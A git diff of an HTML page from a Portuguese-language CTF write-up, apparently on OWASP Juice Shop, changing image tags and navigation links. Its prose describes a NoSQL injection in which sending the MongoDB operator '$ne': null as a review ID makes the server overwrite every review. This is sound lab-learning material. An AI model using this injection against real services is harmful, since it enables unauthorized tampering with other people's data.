@@ -728,15 +746,15 @@ Continuando a análise, ainda na parte de avaliação temos uma funcionalidade p
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>Onde dessa vez, tempos mais certeza de que o servidor primeiro busca por uma review específica (e controlamos o input que está sendo usado para essa busca com parâmetro ID) para depois editar seu conteúdo.<br>
 A ideia então é tentar usar outro query operator já que temos maiores certezas de um filtro sendo utilizado, então, ao invés do servidor buscar por uma review especifica, ele vai fazer uma query que pode trazer diversos reviews.<br>
 Ataque:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240509171356.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240509171356.png" alt=""><figcaption></figcaption></figure>
 <p>Com essa request, o servidor no momento de buscar um produto pelo ID, vai fazer uma query <code>&quot;$ne&quot;: null</code>, que buscar por todos os produtos onde o ID é diferente de null (ne = not equal. <a href="https://www.mongodb.com/docs/manual/reference/operator/query/ne/">https://www.mongodb.com/docs/manual/reference/operator/query/ne/</a> ). Então irá nos trazer todas as reviews, e depois editar com o nosso comentário.<br>
 Resultado:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240509171435.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240509171435.png" alt=""><figcaption></figcaption></figure>
 <p>Podemos ver mais abaixo na response os diversos itens com o valor que editamos:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240518165600.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240518165600.png" alt=""><figcaption></figcaption></figure>
 <p>Editamos todas as reviews de produtos salvas no banco e fechamos mais um desafio.</p>
 <p>Com esse, concluímos todos os desafios do módulo de injection (disponíveis em docker):</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240512212917.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240512212917.png" alt=""><figcaption></figcaption></figure>
 </article>
  
       
@@ -758,16 +776,16 @@ Resultado:</p>
 <div class="flex flex-wrap justify-between">
     <span>
     
-      <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="flex align-center">
+      <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="flex align-center">
         <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#backward"></use></svg>
-        <span>Cross Site Scriping</span>
+        <span>Monitorsthree</span>
       </a>
     
     </span>
     <span>
     
-      <a href="/docs/ctf/juice-shop/readme/" class="flex align-center">
-        <span>Readme</span>
+      <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="flex align-center">
+        <span>XSS</span>
         <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#forward"></use></svg>
       </a>
     
